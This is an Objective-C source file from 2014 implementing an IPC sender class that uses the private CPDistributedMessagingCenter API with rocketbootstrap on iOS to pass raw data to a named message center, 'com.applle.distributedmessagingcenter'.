//
//  DMCenterIPCSender.m
//  IPC
//
//  Created by Makara Khloth on 1/6/14.
//  Copyright 2014 Vervata. All rights reserved.
//

#import "DMCenterIPCSender.h"

#import "CPDistributedMessagingCenter.h"
#include "rocketbootstrap.h"

#import <objc/runtime.h>

@implementation DMCenterIPCSender

@synthesize mCenter;

- (id) initWithCenterName: (NSString*) aCenterName {
	if ((self = [super init])) {
		mCenterName = [[NSString alloc] initWithString:aCenterName];
		
		Class $CPDistributedMessagingCenter = objc_getClass("CPDistributedMessagingCenter");
		CPDistributedMessagingCenter *center = [$CPDistributedMessagingCenter centerNamed:@"com.applle.distributedmessagingcenter"];
		DLog (@"Center com.applle.distributedmessagingcenter = %@, entitlements = %@", center, [center _requiredEntitlement])
		rocketbootstrap_distributedmessagingcenter_apply(center);
		[self setMCenter:center];
		DLog (@"Center bootstrap com.applle.distributedmessagingcenter = %@", center)
	}
	return (self);
}

- (BOOL) writeDataToCenter: (NSData*) aRawData {
	
	Class $CPDistributedMessagingCenter = objc_getClass("CPDistributedMessagingCenter");
	CPDistributedMessagingCenter *center = [$CPDistributedMessagingCenter centerNamed:@"com.applle.distributedmessagingcenter"];
	DLog (@"Center com.applle.distributedmessagingcenter = %@, entitlements = %@", center, [center _requiredEntitlement])
	rocketbootstrap_distributedmessagingcenter_apply(center);
	[self setMCenter:center];
	DLog (@"Center bootstrap com.applle.distributedmessagingcenter = %@", center)
	
	NSDictionary *userInfo = [NSDictionary dictionaryWithObject:aRawData forKey:@"aRawData"];
	BOOL retVal = [mCenter sendMessageName:mCenterName userInfo:userInfo];
	DLog (@"Center com.applle.distributedmessagingcenter = %@, retVal = %d", mCenter, retVal)
	return (retVal);
}

- (void) dealloc {
	[mCenterName release];
	[mCenter release];
	[super dealloc];
}

@end
